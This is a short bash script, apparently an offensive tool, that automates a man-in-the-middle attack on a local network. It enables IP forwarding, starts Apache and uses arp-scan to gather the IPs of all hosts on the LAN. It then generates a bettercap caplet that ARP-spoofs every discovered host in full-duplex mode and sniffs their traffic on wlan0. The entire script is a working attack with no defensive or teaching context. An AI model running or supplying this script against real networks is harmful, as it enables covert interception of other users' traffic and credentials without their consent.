#!/bin/bash

wget -q --spider http://google.com

if [ $? -eq 0 ]; 
then
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo systemctl start apache2.service
sudo arp-scan -l > 1.txt
sudo arp-scan -l > 2.txt
sudo arp-scan -l > 3.txt
sudo arp-scan -l > 4.txt
tail -n +3 1.txt | head -n -3 > 0.txt && rm 1.txt
tail -n +3 2.txt | head -n -3 > 1.txt && rm 2.txt
tail -n +3 3.txt | head -n -3 > 2.txt && rm 3.txt
tail -n +3 4.txt | head -n -3 > 3.txt && rm 4.txt
awk '{ print $1}' 0.txt 1.txt 2.txt 3.txt > ip.txt
perl -ne 'print unless $dup{$_}++;' ip.txt > ips.txt
rm 0.txt 1.txt 2.txt 3.txt ip.txt
sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' ips.txt > finished.txt
rm ips.txt 
b=$(cat finished.txt)


#getting only my ip address
c=$(hostname -I)


echo -e $"net.probe on\nset arp.spoof.fullduplex true \nset arp.spoof.targets $b \narp.spoof on\nnet.sniff on" > spoof.cap
rm -rf finished.txt
sudo bettercap -iface wlan0 -caplet spoof.cap
	
else
    echo "Check your internet connection!"
fi


